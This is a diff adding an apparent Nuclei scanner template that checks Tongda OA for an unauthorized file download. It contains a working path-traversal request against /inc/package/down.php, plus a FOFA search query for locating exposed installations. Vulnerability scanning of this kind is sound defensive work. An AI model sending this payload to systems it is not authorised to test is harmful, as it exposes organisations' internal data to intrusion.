@@ -1,0 +1,27 @@
+id: down_unauthorized
+info:
+  name: 通达_down_unauthorized
+  author: mike
+  severity: info
+  description: 通达OA（Office Anywhere网络智能办公系统）是由通达信科科技自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="TDXK-通达OA"
+http:
+  - raw:
+      - |
+        GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "org"
